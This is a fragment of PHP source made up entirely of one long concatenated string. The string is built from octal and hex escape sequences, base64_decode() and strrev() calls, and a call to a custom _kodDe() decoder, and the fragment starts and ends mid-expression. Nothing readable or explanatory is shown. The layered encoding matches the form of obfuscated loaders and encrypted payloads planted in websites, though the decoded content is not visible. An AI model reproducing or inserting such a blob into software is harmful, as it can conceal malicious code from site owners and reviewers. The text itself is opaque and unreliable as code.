\202\124\262\124\70\225\256\26\53\153\240\141\240\305\241\345\121\200\347\140\265\177\336\22\102\107\74\203\255\40\116\347\213\130\46\217\230\245\252\240\274\35\35\147"."\326\114\61\124\7\317\350\333\126\360\61\60\130\126\30\213\301\215\132\341\347\172\201\230\277\225\102\171\124\2\363\144\174\262\15\120\305\164\52\66\20\341\7\4\50\107\267\13\106\10\23\111"."\xb9\x60\x7b\x73\x38\xd2\x46\x9f\xa9\x45\xfd\xad\x81\x36\x9f\x7\x90\x38\x85\x4\x5a\x1e\xf3\x4f\x4a\x83\x52\x89\x31\x1f\x4d\xaa\xb4\x4d\x3f\xf9\x10\x9b\xb2\x18\xf9\x2a\xda\x57\xaa\x85\x98\x21\x3a\xb\xf9\x14"."\164\6\126\137\41\366\0\64\122\245\241\222\232\154\201\46\271\365\265\160\44\246\242\11\0\364\54\141\335\112\211\132\110\132\340\370\321\325\0\343\354\173\21\167\143\60\343\63\311\70\63\322".base64_decode('hhrHbfrD7c1B9iKvCc7B+aRhK9QUCWKLHPB9hTUlvYNEEaGRgSL5wSQPCyMHOIPTfBQRJA==')."\x1f\x45\x38\xb1\xc1\xa5\x24\x6b\x72\xf8\xfb\xd1\x76\x1e\x16\xc\x2c\x8a\x74\x46\xd9\x83\xc\x8c\x7d\x97\x35\xf1\x70\x2b\x7f\x8f\x8e\x33\xc2\x11\x29\xe2\x8b\xf8\xda\xa2\x3c\x1a\x59\xc6\x1f\x78\xf0\x34\xfa\xd0"."\x43\x6d\xef\x6c\x13\x18\x3f\xe4\x5b\x8a\x80\x25\x2c\x18\x14\x86\xad\xab\x3c\x53\x17\x56\x77\xd3\xb7\x73\x34\x48\x7f\x16\xb1\x18\x7e\x4f\xd4\xb3\xa6\xd6\xa5\xcc\x5a\x57\xd\x65\xb8\x65\xb\xab\x2f\x9d\x63\x1c"."\x24\xfe\xca\x92\x90\x1a\xa\xb7\xd0\x38\xb1\x72\x17\xc8\x25\xc5\xe9\x43\xe9\x52\x10\x3b\x1b\x13\xec\xac\xc9\x48\x17\xdf\xd\xa\x82\x61\x85\xbe\xc4\x55\xda\xc3\xcb\x7c\xc2\x70\x9a\x94\x1\x29\xc2\x8e\x9a\xf7"."\x8c\xae\xee\xc1\x6e\xf\x62\x16\xcc\x95\xe2\x2d\x5c\x53\xa3\xc2\xd8\x10\x62\xd4\x4\xe\xf3\x50\xdb\xc7\xc8\xe8\x4a\x17\x50\xc\x35\x63\xa4\x98\xb9\x21\x84\x10\x19\xbb\x40\x7f\x97\xb3\x0\xc1\x95\x50\x21\x41"."\136\51\17\361\116\370\334\247\253\335\153\273\247\164\273\75\364\1\42\146\136\272\135\242\113\152\140\71\242\261\321\250\355\365\244\112\14\153\101\353\150\224\20\242\273\226\106\346\303\17\234\257"."\346\3\267\17\321\5\15\174\61\3\113\326\266\243\177\55\261\265\1\364\57\204\176\102\61\264\134\151\136\0\155\311\120\160\161\140\55\376\117\144\124\363\211\244\357\214\354\25\202\355\153\321".base64_decode('/wjBrA22OxtrDMSWBQK0AAvDryiKEA4MVbKCiHX/IVu8BYCmVbWKTKa7Z1q1qnrNToAXbg==')."\xba\xa3\xaa\xf2\xd4\xda\x4a\xa0\x21\xbe\xa8\x5f\x60\x5f\x1b\x40\x94\xc2\x2\xd1\xd4\xb7\x3\x2\xb7\xed\x7\xf1\x96\x48\xb8\xb3\x43\x8a\xb7\xfa\x96\x6\xdb\x5b\x58\xcc\x3b\x95\x85\xa6\x42\xd3\x4a\x53\x30\x8a"._kodDe('LLqYcsGKQ4YOstUEYjqobNgSX3bPLSI6fC0e/jC+QtFef1ezj4VCRO4JDnT2ojTCLLuGZZ4=')."\x2c\x4e\xde\x8c\xb3\x8\x9e\x72\x16\x26\xe0\xc6\x22\x64\xe\x58\x84\x4e\x0\x8b\x91\xe9\x62\x11\x62\xda\x90\x45\xc8\x40\x59\x4\x9f\x4e\x2\xed\x2c\xf\x9d\xfc\xd0\xa9\x8d\x1d\xe7\xfa\xb4\x1\xfe\xe2\x71\x5e".strrev('ñÌ$.W»~ƒ)\'Ì@–—‘	%>ËâôŠ{Ú§œt“iYéÖ\\j*:ºØ_åCØ8ÀõÙ.2')."\112\6\247\364\261\257\25\113\133\31\333\107\341\121\40\372\150\220\274\304\224\76\313\36\117\20\121\237\152\110\202\146\102\267\345\4\41\134\242\122\151\220\313\12\331\15\126\142\44\22\133\32"."\xb5\x9f\xa8\x38\x9a\x5a\xc9\xf\x4a\x60\x2d\xc1\x5\xbf\xd0\xa3\xa3\xe9\x4f\x37\x44\x99\x64\xa2\x1b\x3e\x52\xe9\x2\xa2\xdb\xcd\x18\xf6\xae\xee\xa1\x9a\x1a\x37\xfa\x6f\xe\xfa\xd7\x88\xfe\xf9\xd1\xbf\x0\x4e".base64_decode('aO4emt2MAnObe7xwx8HeXtgNUXZ3V4w3yVCATTVEK2iU1Upzypnow+ZmVCvLZODkiCeEzw==')."\124\14\56\342\115\221\160\7\345\143\224\140\263\102\115\60\50\225\124\160\136\11\14\232\77\22\300\173\214\226\142\171\125\225\66\301\325\202\112\5\236\145\127\333\153\5\333\233\2\313\225\312"."\164\162\110\325\64\25\52\53\150\107\263\206\224\222\226\130\13\264\257\354\36\272\317\30\124\144\40\145\247\156\77\115\213\11\300\55\141\360\210\61\5\366\4\326\5\107\173\236\103\371\152\232".base64_decode('FYwish8KkZGirLSJ2WGXwm0e4ER8hKFCUGiIZdCGaFZgeSziw4mEhz1iIvpD0BI+YxWyGg==').base64_decode('fRdKOD/PShA1rLQxmpQFxawmwB0hnNKYeA6RN9BplqURi4F3p7GOSLDNF1kBUyZOErBxjQ==')."\214\355\165\260\210\244\315\116\351\175\172\73\352\265\374\136\235\256\61\307\323\350\124\314\360\64\352\15\15\126\340\225\247\101\260\147\253\362\347\307\114\24\123\305\236\361\272\130\200\331\177\40"."\57\244\230\24\53\213\20\27\217\211\125\3\330\207\125\221\163\345\67\136\302\340\56\46\265\170\221\31\315\150\366\165\206\344\24\230\52\145\161\140\305\327\354\21\326\323\162\173\204\345\61\241".base64_decode('Dt9tMJ6qmTA+apmiqg6dbIs5bMOG28qEXgGF7oyFVUSFIgFME2BEfFql/kqnd3lRoBlcgA==')."\133\57\376\232\241\261\62\345\206\306\353\163\371\125\240\275\45\330\36\150\150\33\16\106\175\155\12\353\70\110\350\260\205\314\71\320\116\60\254\206\20\147\255\312\102\270\140\30\4\300\66\363".base64_decode('i6oqzJp4NKEPbhWKkjG7tEF0r9v4Mw2iLI4AwiesGnAhNckrxnFtmehBfYeV07RRj3NwYQ==').base64_decode('yuvME8VV28edytZystADF3e67NqYG8ODCp2SVQJcWWEfJHc7OXv3EJnNMLtUqi5Gk9VNkw==')."\337\355\306\372\164\305\314\353\11\142\126\123\1\143\160\112\322\320\115\141\57\34\346\236\234\266\130\320\352\23\366\33\144\173\264\115\215\154\222\213\71\53\252\147\100\70\337\24\47\12\367\342"."\x69\x9c\x78\x8a\x24\x29\xe2\x93\x1b\x17\xb1\x72\xd4\xca\x9e\xa3\x22\xb4\x14\xe4\x53\x23\x95\x12\x89\x21\x61\x80\x16\x5f\x69\x88\x36\x7b\x98\xcc\x40\xcc\xc7\x48\x9a\x11\x41\xe7\x95\x20\xef\x64\xce\xe8\xd0\xb"."\331\64\271\325\131\46\56\155\200\316\240\6\350\372\173\24\107\75\171\326\361\115\140\111\111\154\247\342\353\326\220\231\44\43\75\223\336\105\342\50\300\12\276\326\224\136\233\24\163\350\43\156".base64_decode('+f0Sgh2SKL2YYCYJaWw2KB8h+IRAClLYb4HleIRdG9Im5qrcws5EUpOfikoW50+RIYUsuQ==')."\x80\xed\xde\xb4\x6c\x74\xc2\x23\x6c\xf8\xf2\xed\xb2\x88\x2f\x14\x7e\x42\xd\x77\xeb\x98\x61\xef\x55\xa5\xbe\x74\xf0\xf2\xc2\x7a\x27\x9d\xd\x69\x19\x48\x2\xd\x92\xd\xae\xd4\x8b\x4e\xb4\xa6\x31\xfc\xf\x4b"."\xb0\x23\xa5\xb6\x31\x1b\x4c\x60\x41\x38\xc4\xd4\xc1\xf0\x93\xf\xdd\x2\x43\x5f\x36\xfc\x14\xc\x43\x5d\x8f\x8e\xdf\x4f\xd1\xd7\x2c\x1\x6e\x80\x11\x55\xa4\xd6\xea\xbe\xb9\x52\xa7\x64\x44\x79\x1c\x94\x52\xb6"."\236\37\12\362\17\26\210\320\351\233\77\30\321\5\325\107\325\310\163\265\157\254\44\120\54\371\22\251\44\241\145\107\35\2\216\364\151\15\254\174\37\144\13\30\103\264\240\75\254\266\42\162"."\23\146\114\111\332\214\331\320\73\253\5\50\304\102\74\123\302\113\36\377\302\301\161\36\321\35\240\367\227\260\330\153\20\346\346\41\246\371\1\46\275\4\63\340\243\77\53\262\111\67\352\70".strrev('XãƒÇvÃE›ßt)C4¢S,Li×ã 6ªjÉAØ#–téégÜI£ÙŒ%E¸·R]@').base64_decode('tqVGAv4V/LqFpzb7ljpTglg26Wspm8wlZjidHE3VSBiLFgOhZkeFaCu3uGtPU0PB9sVlMw==')."\20\153\322\46\125\241\211\301\130\240\315\231\146\157\41\32\360\105\230\71\150\34\157\14\205\375\122\166\60\134\72\23\234\367\341\211\124\60\111\23\275\147\124\165\257\41\247\242\172\164\70\112"."\xae\xc5\x12\xc\xb7\xda\x33\xad\x7a\x61\xf7\xba\xea\xaa\x6e\xef\x42\xcf\x54\x2e\x78\xa3\xe8\x4a\x7a\x9a\x3b\x4e\xb2\xc9\x88\x4f\xbd\x33\x1\xd3\x2d\x96\x48\xab\x41\xcc\xeb\xf1\xc0\x47\x78\xc0\xdb\xed\x65\x66"."\273\274\42\23\176\105\371\111\16\32\3\346\327\243\324\6\222\255\243\16\123\41\354\155\276\307\371\204\114\145\357\306\30\146\325\172\231\316\100\220\136\337\252\321\25\121\276\126\366\64\33\104".strrev('é÷¡[IF <HÖ$º¶"‰N¶Ä[±'."\r".'¤òNZ$öÚ@Ú'."\n".';«Œh¹¿Ñ…\'U–˜R')."\0\354\312\50\333\275\71\104\53\201\30\373\21\327\332\322\32\74\155\161\250\255\75\334\261\44\22\215\165\56\135\266\174\5\30\212\254\147\100\323\253\270\231\54\4\14\325\172\7\264\202\167"."\200\231\336\137\212\17\35\272\351\225\231\71\236\210\306\210\315\10\63\103\150\124\204\301\163\61\366\360\226\317\242\255\171\263\71\253\166\234\22\35\5\75\156\30\326\70\271\113\333\276\276\141"."\310\354\352\66\173\70\224\46\365\1\10\12\265\66\123\34\265\200\311\160\313\56\0\60\264\312\374\142\62\356\340\6\40\101\270\306\220\170\6\221\310\15\111\323\350\260\56\224\1\215\101\311"."\x10\x33\xdb\x34\xab\x89\xe9\x4f\xa7\xdd\xd0\xd5\x6e\xad\xdf\x96\x2f\xcc\x2f\xaf\x76\xa3\xe3\xa7\x2d\xee\xb0\x1d\x3a\x85\xe0\xf8\x36\x23\x55\xa8\xf3\x5a\xb8\x27\x39\x44\x17\xe0\x6b\xc0\x29\xc8\xdb\x80\xd0\xa"."\256\335\203\51\122\253\143\23\362\104\156\113\43\112\264\34\353\225\31\140\64\277\31\361\324\111\245\213\262\311\40\322\307\54\26\261\373\116\243\56\105\230\247\146\302\130\273\335\151\266\17\260".base64_decode('3Ex6BJuQLSkwrJrtF+pi2X6u5JGwcRWYgDdLWmWCcQDvFiivcZhpxMLT0sbhiORfyGbFQg==').base64_decode('9gei5fP+PjwG2+a0JSXkSC9WTZFVWuzGr1F2E+Xekry8KULcjmmvZOG0pAXE6eUC7BV9SQ==')."\56\142\13\323\42\373\353\373\322\106\246\227\27\206\223\1\100\75\243\11\46\333\155\123\206\334\206\151\272\363\5\3\353\261\65\244\263\51\257\71\10\171\31\315\264\226\332\254\13\175\243\355"."\153\154\104\243\215\363\311\320\205\41\67\201\152\366\21\211\231\361\26\210\352\230\153\20\350\202\213\330\275\124\153\30\300\170\121\337\274\330\54\42\141\150\271\372\131\70\312\356\177\354\243\247".base64_decode('vqekIzZYZuP2nrk1aGEymortaViYtEV8uS+FbYoYOea1hvoSkG2SJ3XSXf6KXjLnjf1ZoA==')."\xad\xce\x34\xf4\x24\xc3\xde\x88\xd3\x4b\xf1\x65\x24\x56\x7c\x65\x6b\x89\x78\xca\xdd\x59\x9b\x1b\xb\xba\x40\x76\x73\xd9\xa6\xae\xf7\x33\x8d\x42\xbc\xda\x2\xa3\x14\xb8\x55\x73\x7a\x9b\xeb\x2e\x9b\xe0\x96\x74"."\x4\xe9\x7e\x92\xdc\x1b\xe0\xcf\xc1\x1\xbf\x8f\x3a\x4e\x80\xfe\xd2\x9f\xd3\xcb\xf5\xde\x5d\x10\x86\xc6\xd1\xea\x50\x37\xc\x8b\xf5\x61\x66\xbb\xdb\x81\xe6\x1c\xe6\xbe\xbb\x5b\xba\xdb\xba\x63\xf2\x70\xad\x82"."\xd6\xdb\x8b\x3a\x2b\xd9\x41\xb5\xf5\x45\x58\x17\x7\x68\x22\x2e\x49\xd8\x14\x8c\x6f\x9b\x1c\xae\x2a\xa6\x94\x35\x6d\xe\x99\x11\x3a\x76\x3f\x3e\x56\xd\x61\x7f\x11\xc2\x10\x67\x67\x24\x64\xbb\x7f\x82\xa2\x6c".strrev('~×Ç=&µ:i‡æØÈñİï²ìy¿ûÕïv:Ş×cÑ7JtO¢ª9$™Š2ğS?n}#”')."\xec\xd2\x2b\xf7\x3d\x72\xd3\xfe\xbb\x1f\x7f\xef\xda\xbb\x3f\x7e\x74\xfd\xfe\x6d\xf\x62\x4d\xa3\x5b\x7e\x4c\x15\x8f\x46\x37\x9e\x3b\x76\xf5\xf6\xd1\x8d\x97\xec\xbf\xff\xfc\xb1\x87\x2f\x1f\xbb\xe9\xbc\xf7\xae".base64_decode('v/zds8+F3ZMjFkF9hVRRzBOtMnbro6OPbnzvquv3b9smlbewHlxG2j5oJUcvvOC987aMbg==')."\274\142\337\125\267\224\124\240\37\160\256\65\36\336\325\27\357\273\341\174\51\307\131\251\221\130\37\27\347\163\136\207\146\214\136\276\141\337\117\267\73\53\121\373\371\145\52\215\135\163\321\336".base64_decode('Rx5wVGo3osVEX6Nk5nxs/UWjd9/AP7J3xwaqUu6owjXfeHnafmn5KIPqJkM3ES1t06wEbA==').base64_decode('5H1bH0P9oTMmr9zotgv33XrOvq0/gpW4btvo5T8Z23r7vtvu5s0CVNnUaHED95y7/4ELxg==')."\xae\x7d\x80\x17\xc4\xdb\x3e\xa9\x88\x32\x4\xa2\x68\x19\xac\x3e\x4f\x3e\xb8\x6f\xe7\x15\xfb\x1e\xd9\x8c\x81\xe4\x92\x73\xf7\x9d\xfb\xd0\xe8\xe6\xed\xa3\x37\x9d\xcd\x3f\x3b\xba\x63\x87\x98\xe5\xb0\x97\x78\xf6"."\x2a\x83\x70\x97\xe0\x74\x40\xb9\xbd\x42\xd9\x37\x5f\x94\x9c\xe0\xc9\x48\xe\x33\x5e\xdc\x21\x18\x96\x40\x51\x57\x7\x8c\x9f\x22\x5e\x9\xc0\x2d\x4e\x3\xdb\xb4\x68\x1e\x73\x8d\x46\x12\xe6\x7e\x4d\x5\x42\x9f"."\25\365\25\247\126\241\337\352\12\127\5\76\135\220\70\106\240\70\201\364\243\242\376\324\52\22\250\6\223\106\43\100\73\44\253\306\142\343\201\134\166\41\302\36\322\275\345\102\102\212\60\241".strrev(' ¨Bü;P'."\n".'2Ùƒ2šºå]dh5ºí›—a!z‡Ô '."\r".'8G4äê³8Q¸[ñyÖó«')."\107\125\11\57\337\120\12\164\120\41\116\265\201\155\305\37\374\371\350\5\367\276\167\355\126\147\131\52\65\201\262\230\105\53\361\332\110\337\134\214\136\161\135\351\367\110\171\373\327\130\341\321"."\163\66\357\273\312\121\222\351\317\52\222\170\114\124\40\320\357\300\43\234\66\310\125\50\274\377\157\166\21\25\126\326\143\261\75\115\130\356\356\314\17\27\163\156\54\276\162\107\145\253\227\16"."\207\76\65\366\362\130\0\145\57\57\363\14\11\101\173\263\42\110\35\15\325\53\262\33\60\311\170\67\21\156\122\342\306\64\232\40\15\263\23\54\111\260\26\275\342\205\11\346\20\124\73\207"."\260\310\321\137\254\221\342\106\154\76\336\143\150\343\132\151\311\205\201\134\304\356\127\312\351\155\312\71\13\244\12\226\206\272\145\117\127\103\350\34\206\263\261\377\22\67\226\255\272\323\311\361".base64_decode('cgTiKNvVBLgNKFeks5hOOj9JNG/cxSL7YNlG5VMiK0AGEeTtyZ4wsDDNza8InY42xMlaKw==')."\165\22\262\42\233\124\352\246\327\317\234\213\376\2\227\301\24\207\212\171\246\342\217\202\314\211\310\51\336\136\206\153\204\237\50\66\66\274\340\222\273\25\133\262\230\106\356\7\202\41\51\133"."\x39\xd1\x5b\x9b\x97\x33\x18\x28\x15\xec\x48\xfe\x61\xc8\xc5\xe\x45\x51\x58\x9d\x4e\xe5\x7e\x74\xca\x60\x6b\x74\x44\x67\x7c\x17\x70\xa1\x92\xd7\x49\xbe\x20\x29\x16\x28\xf0\xf2\x9a\xd8\x22\xf1\x4c\xbf\x18\x9".base64_decode('wS8A4f2oo4Y4NRF+VcIMib5irr9BylQsw1CyWm4YDqOTzfrJ5jz8oQb8jsOczFwmCdPPmA==').base64_decode('VgnbntQyFeTQaywPdn3mwYQwUpS8QKqI4jm0J2R/tx2EEgBtpL6pICPU2RJslxQDpQTV3w==')."\xd4\xae\xfa\x3a\x3a\xca\x66\xc0\x62\x51\xf9\x33\xd6\xaa\xf1\xac\x92\xdc\x63\xd2\xd0\x7c\x74\x68\x53\x12\xf8\x25\x51\x43\x5\x4e\xad\x50\xcc\x42\x82\xd9\xc8\xae\xf0\x82\x9e\x19\x29\x20\x78\xa7\xf9\x69\xa8\x52"."\211\253\50\275\150\114\156\22\242\331\225\13\346\173\323\120\323\343\235\204\61\273\27\153\330\345\246\340\165\226\25\176\110\152\263\260\377\245\50\363\65\205\316\150\103\45\271\115\251\124\372\20"."\xf5\xe7\xea\xc5\xb\x9c\x95\xb9\x3b\xb3\xf9\x5e\x4d\xce\xc4\x7b\x2c\x62\xb0\x93\x25\x3f\xcd\xf\x70\x73\x97\x65\x2f\xd2\x7c\x92\xe1\x7c\xe2\x79\xc8\xaf\xe5\x96\x96\x56\xc1\x8d\x7b\x12\x72\x56\x17\x7d\x45\xd6"."\43\57\37\171\277\125\132\333\113\344\106\136\41\306\120\251\333\317\362\327\220\374\366\255\14\140\140\125\31\4\372\114\107\101\113\364\143\340\23\224\2\272\1\31\35\130\50\101\63\154\256\102"."\x2c\x49\xe7\xa9\x88\x9f\x31\x92\xbb\x9c\x82\xf0\xa4\xb6\x66\xd\x6d\x8\xbb\x90\x59\xb7\xae\x34\xd\xb4\xa8\x9d\x59\xbe\x7c\xda\x99\x84\x21\xc8\x99\x86\x85\x43\x22\xd\x91\x3c\xfb\x67\x28\xf4\xca\x85\x44\xa"."\53\103\177\105\235\120\173\213\210\320\55\146\313\354\142\372\117\44\326\335\125\351\231\272\156\235\67\315\164\15\231\106\23\253\353\341\245\151\274\333\143\57\217\106\2\123\317\13\102\202\263\44"."\x65\x67\x4f\x83\x4d\x78\x84\x77\xaa\x78\x7a\xc9\x75\xa\x15\xac\x68\xd8\xd0\xb0\xa0\x8b\x73\x59\x3d\x2c\x4f\x25\x32\x15\x79\xed\x18\x97\x9a\xae\x9d\xc3\x80\x2\x1d\x23\x63\xcb\x78\xd0\xdf\x2e\xf8\x70\xbe\x2f".base64_decode('KKbxEOmez26Fe6FwNkfnWQ778nkbSmERfLGVSce9HA/Qyy5PQrxtZEUIFnKkYxVBRwZ2Zw==').base64_decode('TJIHECY1Chxv8XTUFk8EMMe4RUIlPHu+mSik85YNr1EfzxXEZdkqbUCjRSoUkNw1VBDHEw==')."\x15\x8\x8f\xd1\x1c\x86\xcc\x78\x7\xe7\xe3\xaf\x21\xd6\x38\xd3\x50\x41\x6\x61\xf6\xe9\x3a\xaa\x4f\x70\x55\xb9\x8f\xa0\x8a\x15\xa\xc3\xa6\x59\x8d\xcf\x63\xc1\x32\x10\x2d\xe5\xef\xe6\xc0\xd\x64\x67\x4\x9e"."\x24\xf9\xda\xe1\x8a\x71\xd2\x19\xf4\xf7\xd4\x49\x9c\x70\x60\x1f\x95\x19\xc4\x33\x93\x7\x17\x4\x6f\x11\xc6\xbc\x17\x4b\x64\x69\x21\x70\x47\xd9\x11\x9\xc7\xc2\x7e\xe6\xed\xcd\x2e\xba\xa5\x69\x33\xd8\x21\xc3"."\244\257\104\305\271\214\275\227\343\32\105\254\4\347\56\274\220\2\320\120\50\346\162\134\305\23\303\53\47\201\15\345\377\164\221\133\120\75\331\63\116\276\322\245\261\73\122\300\256\364\322\67".base64_decode('2le0BBXGni1i+MW7CcmSeVBsnFRPerroC/2GGvZoiimUireSrKSco2DS0COTay+gT7GzKg==')."\xf1\xb5\x1e\x78\x63\xaa\x74\x55\x56\x79\xa6\x56\x57\x96\xe6\x50\xd5\x5d\x7b\x3e\xd6\x80\x53\x4f\x8b\xa2\x4c\xf0\x7d\x4\x24\x9e\xbc\x4a\xf4\x87\x82\x81\xf6\x98\x1a\x4\xea\x5e\x5b\x37\xdb\x53\x23\x5e\xc\xa6".strrev('DFnzÉù˜)/eı¦»MM]lÌÍ)ÒÆ“g=SÅq‰W½'."\r".'LÊ°Û«<İ²ı†—êaM').base64_decode('FKmpqSd/aQZxbAYgaM9BKJHhcigwqOvQIaCd6KRcZPxolx8/9FRw12BZhOIsgj5in5WhVQ==').base64_decode('m8NMhdzxQ0x3TgJXngB4ZrcD1Og2I5WoIykyKdBf/m4YFRO7Zh59wN3AOxXIJbvkj3nY5A==')."\322\104\141\160\336\315\62\334\262\267\27\250\104\21\235\270\27\264\165\15\325\261\33\176\305\51\210\263\111\360\161\342\4\111\122\213\171\134\311\230\55\216\312\327\177\44\233\77\276\45\261\14"."\xb7\x7\x82\xa3\xed\xbc\x25\xea\x54\x88\x7a\x92\x87\x39\x2c\xb3\xb\xfb\x8c\x41\x55\xf0\x26\x38\x7a\x1a\x8f\x91\x29\xc5\xa7\x4d\x6\x86\x49\xe9\x81\x34\x9e\x57\x46\x93\xa4\xe2\x5c\x49\x4d\x68\xf8\x80\xc2\x12".base64_decode('MX3Rn7Yb4VClqvLczsMF2Uhi9pq4IYS/fNy1EtVRZn1TAKPQKDE/T930EvlN/REli2s5Fw==')."\226\254\221\355\142\303\251\31\310\142\322\112\261\273\256\350\67\50\357\261\224\0\113\240\267\164\176\156\365\125\152\300\231\345\250\343\243\127\144\45\25\40\275\264\64\271\111\54\123\32\247\73"."\x4a\x13\xfb\xae\x7e\x6e\xc6\x5a\x36\xfa\x4a\x45\x4f\x92\x92\x98\x9\x1e\x37\x84\x86\xe\x6b\x63\x40\x3a\x88\x7a\xf2\x5\x23\x85\x56\xdd\x94\x27\xd\xa5\x77\x94\x4f\xe6\xc5\x4b\x4b\x96\x29\xc4\x7b\x2f\x97\x93".base64_decode('E/GdJfP/DeAs7A1oSU4cpaJRYc5bJNp3s5Th5x7Q5ER8sJV1ssipwt4GPjHbU3jPvgbomA==').strrev('…M’ê¾gF]F8"í„YQ¦=…²„†x`*eX0˜UnÉB–0&-2ª²ğçÃ¤')."\10\61\367\305\121\233\215\164\0\323\172\306\213\310\325\354\171\357\134\170\5\13\154\142\245\360\264\162\207\233\362\225\33\236\122\125\26\23\341\35\335\312\335\241\227\1\104\73\260\225\100\25"."\241\333\270\201\172\216\12\245\30\156\235\335\166\242\123\262\111\205\236\56\234\254\120\267\332\12\166\26\176\212\175\175\112\53\200\37\62\3\161\217\330\204\264\134\11\267\325\351\100\121\213\155"."\30\221\367\225\262\156\114\175\125\231\354\251\3\325\332\311\314\27\11\305\307\102\223\302\13\303\356\102\303\352\101\107\35\101\115\140\101\272\50\66\146\155\342\56\103\50\311\326\107\261\123\127".strrev('è{Š´coæHgÈ”—Şn1ãñaŒ¨üÀm9¸×Ø5ÅÉ”Y<Gœİ!G§„°úÆêˆCr(V‰')."\252\115\211\100\62\345\317\213\242\156\260\316\153\254\157\104\35\224\170\102\220\116\354\216\250\123\171\26\327\220\70\32\24\225\50\57\241\373\26\43\335\314\121\202\120\72\45\101\201\200\337\271"."\xee\x42\x16\xb8\x40\xc0\x51\x54\xd2\x55\x2c\xd3\x3f\x68\x95\xb7\x89\x7b\x20\x79\xac\x7\x6\xa6\xa0\x27\x8c\x42\x12\x13\x44\xc9\x6c\x4d\xce\x8a\xe8\x29\x39\x4a\xf4\x15\xd8\x6e\x10\xc6\xd6\xe5\x26\xb0\x2d\x30"."\x9\xed\xe0\x5d\xe8\x4b\x58\x45\xd9\xb2\x98\xe4\x8f\x1\xc5\x24\xbf\x1b\x12\x23\xea\xae\x55\x38\x7\xab\xd2\x96\x69\x64\x9a\x94\x41\xca\x97\x63\x66\x1d\x2\x5b\xe9\x5\x1b\x91\x4c\x45\x8b\x71\x7e\xfd\xec\x60"."\61\331\243\70\105\346\340\330\53\67\334\0\61\365\204\107\140\312\171\250\131\154\7\135\214\114\256\102\276\131\122\205\346\141\46\112\74\207\223\163\114\354\120\243\223\255\142\271\234\62\237\42".base64_decode('WdKMJhikwS5fISYJMoZ1pq3trq1zT4cTjPxEjh3OgI6gjSWBAT7eMjQGus5QTpQxpEt8Yg==')."\x5c\x49\x18\x8e\x21\xf6\xa2\xf8\x7a\x12\xc3\x52\x3c\x56\x90\x78\x9\xe1\x88\x9e\x58\x5e\x92\xd1\xba\xd0\x51\xa2\xea\xd1\xb8\x40\x67\xb9\x7c\x3a\x43\x38\xbb\xc9\xa6\xd0\xee\x28\x80\xf6\x87\x3d\x1f\x5c\x6b\x88"."\316\120\343\117\206\115\301\320\321\10\370\157\221\235\207\220\132\142\34\102\353\37\45\31\324\201\207\64\61\102\327\212\332\244\142\317\32\70\222\23\311\61\203\47\226\352\153\141\250\204\46\251"."\55\1\70\361\126\125\143\133\2\66\151\143\333\60\177\361\215\225\34\61\221\346\152\354\246\34\141\271\34\70\115\133\204\52\165\332\152\363\44\136\152\120\147\146\1\330\111\275\243\265\303\313"."\223\32\371\366\244\202\22\141\362\316\317\64\47\365\41\35\16\170\203\331\164\102\11\205\133\202\176\137\250\51\30\135\254\244\360\305\253\320\54\104\335\125\311\266\125\115\341\244\206\170\345\261"."\x6f\x70\x22\x3b\xa6\xcb\xc1\x60\x3d\xce\x3d\xc4\xe0\xa0\x3b\x8e\xce\x11\xee\x24\x3f\x6b\x99\xe2\x54\x45\x46\x8\x8d\x9\x3f\x7a\xf6\x66\x29\x54\xea\x85\x92\x16\x73\xf8\xf5\x5e\xa6\xa4\xe\x96\x88\x97\x29\x9d".base64_decode('EfJfqXC+oJeWH9axhqPUY6lCsUxvoHz5LxC3PnJpxB7pufE6n84NpM20QAesxrDcuq+pLQ==').base64_decode('2K76QqHwMptisLgLKHBBSlJ2sSStjFgE+vVSe4tg3U52X+EQrtDlkw135tkdF/h85S5XaA==').strrev('“'."\n".'Nš»ıil _èÂ4°Ò¥?e·§h´R½3LldËNXğ©®·¨—Sih/–rT')."\174\351\44\323\74\343\117\242\251\67\26\277\354\365\226\175\123\370\374\51\115\371\237\272\220\163\211\173\102\225\30\61\143\116\52\15\162\154\2\236\236\246\5\303\52\21\212\113\306\351\20\27"."\x53\x18\xce\xcb\x17\xb5\xde\x24\xb4\x80\x8d\x8f\x6\xd8\xa5\x20\x8e\x88\x73\xb\x2e\x5\x8d\xe0\xaf\xd0\xd3\x2c\x3a\xa4\x63\x81\x22\x3b\xe1\x30\xe1\x1c\x42\x23\x30\xe1\x36\x6d\x4b\x87\xf\x3c\xa7\x7e\xbc\xcd"."\xc3\x5d\xc9\x37\x88\xc3\x15\x9a\x47\x6e\xa6\x50\xc9\x1e\x31\x26\x14\xe3\xe\x96\x44\x55\x67\x4e\x99\xe\xa0\x6c\x45\x88\xbc\x78\x1\xa5\x41\xa9\xa1\xee\x18\xb9\xf3\x1c\x65\x3e\x33\xfc\x20\x3e\x40\xc\x8\x6"."\262\171\313\166\322\157\225\337\312\110\113\102\23\260\374\247\300\5\170\164\315\131\24\57\154\3\133\114\125\246\235\4\17\213\363\37\126\304\64\262\303\45\11\66\351\130\210\215\206\253\104\143".base64_decode('h0O5XkOedYLP8XMp6mWVCiJc6DyiW6Vu22j1/5uKNDMqWZK1N1LaIdNJPwUvhz3S9RmDdg==').base64_decode('16s4xemDzuZ9TtphxIyB7C/PXslV4vhJIV6zFYSMYO2xKg876JLC0qcn059u+GXU0NkJig==').strrev('v½ ™ÂY—v¡³båS_J›)Ş\'yy,B¤¤.›BD´•À²Lé}ıÕ“àç')."\317\114\134\15\300\24\133\310\264\154\276\300\142\106\114\113\271\50\250\142\244\50\142\215\303\162\130\126\323\47\243\100\231\114\102\230\344\353\275\100\52\300\334\173\46\135\304\367\44\305\213\116"."\147\126\322\376\344\350\127\256\235\312\30\161\55\3\32\204\266\307\165\5\164\104\323\31\11\261\25\243\111\136\55\237\27\367\41\62\305\105\377\333\336\115\103\136\147\254\125\45\66\104\124\252".base64_decode('tBAVMCfdUdJEuK8s5oL0XsaWWpAOj7INZnpXI57fQnHUzw56OQsTJjfJLsy5nB3hI37G9g==').strrev('…oÎZ"ğ5£’©5öŒd)‚Ow©±bƒl4+æP